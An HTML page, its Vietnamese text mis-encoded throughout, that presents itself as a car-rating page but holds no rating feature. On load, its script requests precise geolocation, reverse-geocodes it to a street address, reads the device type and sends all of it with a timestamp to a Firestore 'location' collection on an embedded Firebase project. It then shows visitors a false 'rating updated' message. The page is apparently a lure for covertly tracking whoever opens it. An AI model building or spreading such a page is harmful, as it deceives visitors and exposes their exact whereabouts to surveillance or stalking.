<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ƒê√°nh gi√° √¥ t√¥ c·ªßa b·∫°n</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #e9ecef;
            color: #333;
        }

        .container {
            text-align: center;
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 100%;
        }

        h1 {
            font-size: 28px;
            color: #007BFF;
            margin-bottom: 20px;
        }

        .success {
            color: green;
            font-size: 18px;
        }

        .error {
            color: red;
            font-size: 18px;
        }

        .icon {
            font-size: 50px; /* K√≠ch th∆∞·ªõc bi·ªÉu t∆∞·ª£ng l·ªõn h∆°n */
            margin-bottom: 20px;
        }

        .loading {
            font-size: 20px;
            font-weight: bold;
            color: #007BFF;
        }
    </style>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCPrnIf-vF2_JOf-E8hgtEVOyCq8s1AviY",
            authDomain: "gknm-b263e.firebaseapp.com",
            projectId: "gknm-b263e",
            storageBucket: "gknm-b263e.appspot.com",
            messagingSenderId: "366058775183",
            appId: "1:366058775183:web:3f33135f4b1325d542c6fa",
            measurementId: "G-TWXGN6PJ32"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        async function getLocationName(latitude, longitude) {
            const url = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`;

            try {
                const response = await fetch(url);
                const data = await response.json();
                console.log(data); // Ghi l·∫°i ph·∫£n h·ªìi API ƒë·ªÉ ki·ªÉm tra

                if (data && data.address) {
                    const address = data.address;
                    let locationName = '';
                    if (address.road) locationName += address.road;
                    if (address.house_number) locationName += `, ${address.house_number}`;
                    if (address.city) locationName += `, ${address.city}`;
                    else if (address.town) locationName += `, ${address.town}`;
                    else if (address.village) locationName += `, ${address.village}`;
                    if (address.state) locationName += `, ${address.state}`;
                    if (address.country) locationName += `, ${address.country}`;
                    return locationName;
                } else {
                    console.error("Kh√¥ng th·ªÉ l·∫•y t√™n v·ªã tr√≠");
                    return "Kh√¥ng th·ªÉ l·∫•y t√™n v·ªã tr√≠";
                }
            } catch (error) {
                console.error("L·ªói khi l·∫•y t√™n v·ªã tr√≠: ", error);
                return "Kh√¥ng th·ªÉ l·∫•y t√™n v·ªã tr√≠";
            }
        }

        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceInfo = "Thi·∫øt b·ªã kh√¥ng x√°c ƒë·ªãnh";

            // X√°c ƒë·ªãnh thi·∫øt b·ªã
            if (/iPhone/i.test(userAgent)) {
                const match = userAgent.match(/iPhone\sOS\s([\d_]+)/);
                deviceInfo = `iPhone ${match ? match[1].replace(/_/g, '.') : ''}`;
            } else if (/Samsung/i.test(userAgent)) {
                const match = userAgent.match(/Samsung\s*\/\s*([^\s]+)/);
                deviceInfo = `Samsung ${match ? match[1] : ''}`;
            } else if (/Android/i.test(userAgent)) {
                deviceInfo = "Thi·∫øt b·ªã Android";
            } else if (/Windows/i.test(userAgent)) {
                deviceInfo = "M√°y t√≠nh Windows";
            } else if (/Macintosh/i.test(userAgent)) {
                deviceInfo = "M√°y t√≠nh Mac";
            }
            return deviceInfo;
        }

        async function getLocation() {
            if (navigator.geolocation) {
                const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // L·∫•y t√™n v·ªã tr√≠
                    const locationName = await getLocationName(latitude, longitude);

                    // L∆∞u v√†o Firestore
                    try {
                        const docRef = await addDoc(collection(db, 'location'), {
                            latitude: latitude,
                            longitude: longitude,
                            locationName: locationName,
                            deviceInfo: getDeviceInfo(),
                            timestamp: serverTimestamp()
                        });
                        console.log(`Document written with ID: ${docRef.id}`);
                        document.getElementById("result").innerHTML = `ƒê√°nh gi√° ƒë√£ ƒë∆∞·ª£c c·∫≠p nh·∫≠t.`;
                        document.getElementById("result").classList.add("success");
                    } catch (error) {
                        console.error("Error adding document: ", error);
                        document.getElementById("result").innerHTML = "ƒê√£ x·∫£y ra l·ªói khi l∆∞u th√¥ng tin.";
                        document.getElementById("result").classList.remove("success");
                        document.getElementById("result").classList.add("error");
                    }
                }, showError, options);
            } else {
                alert("Tr√¨nh duy·ªát c·ªßa b·∫°n kh√¥ng h·ªó tr·ª£ ch·ª©c nƒÉng n√†y.");
            }
        }

        function showError(error) {
            let message = "";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    message = "Quy·ªÅn truy c·∫≠p v·ªã tr√≠ ƒë√£ b·ªã t·ª´ ch·ªëi.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "D·ªØ li·ªáu v·ªã tr√≠ kh√¥ng kh·∫£ d·ª•ng.";
                    break;
                case error.TIMEOUT:
                    message = "Y√™u c·∫ßu l·∫•y v·ªã tr√≠ ƒë√£ h·∫øt th·ªùi gian ch·ªù.";
                    break;
                default:
                    message = "ƒê√£ x·∫£y ra l·ªói kh√¥ng x√°c ƒë·ªãnh.";
            }
            alert(message);
            document.getElementById("result").innerHTML = message;
            document.getElementById("result").classList.remove("success");
            document.getElementById("result").classList.add("error");
        }

        document.addEventListener("DOMContentLoaded", function() {
            document.getElementById("result").innerHTML = '<div class="loading"></div> ƒêang x·ª≠ l√Ω...';
            getLocation();
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="icon">üöó</div>
        <h1>ƒê√°nh gi√° √¥ t√¥ c·ªßa b·∫°n</h1>
        <p id="result">ƒêang x·ª≠ l√Ω...</p>
    </div>
</body>
</html>
